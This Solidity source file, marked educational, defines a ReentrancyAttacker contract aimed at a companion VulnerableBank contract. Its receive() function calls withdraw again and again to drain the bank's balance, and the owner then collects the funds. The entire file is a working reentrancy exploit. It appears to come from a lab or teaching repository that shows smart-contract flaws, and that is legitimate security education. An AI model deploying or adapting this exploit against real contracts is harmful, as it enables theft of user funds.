// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../vulnerable/VulnerableBank.sol";

// EDUCATIONAL: Demonstrates reentrancy attack against VulnerableBank
contract ReentrancyAttacker {
    VulnerableBank public target;
    address public owner;
    bool public attacking;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function attack(address _target) external payable onlyOwner {
        require(msg.value > 0, "Need ETH to attack");
        target = VulnerableBank(payable(_target));
        attacking = true;
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
        attacking = false;
    }

    receive() external payable {
        if (attacking && address(target).balance >= msg.value) {
            target.withdraw(msg.value);
        }
    }

    function withdraw() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
}
